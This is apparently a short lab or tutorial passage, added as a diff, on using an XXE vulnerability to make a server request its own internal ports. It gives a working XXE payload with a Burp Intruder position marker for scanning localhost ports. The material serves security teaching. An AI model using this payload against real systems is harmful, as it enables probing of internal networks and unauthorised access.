@@ -1,0 +1,13 @@
+Consider a scenario where a vulnerable server hosts another web application internally on a non-standard port. An attacker can exploit an XXE vulnerability that makes the server send a request to its own internal network resource.
+
+For example, using the captured request from the in-band XXE task, send the captured request to Burp Intruder and use the payload below:
+
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
+]>
+<contact>
+  <name>&xxe;</name>
+  <email>test@test.com</email>
+  <message>test</message>
+</contact>
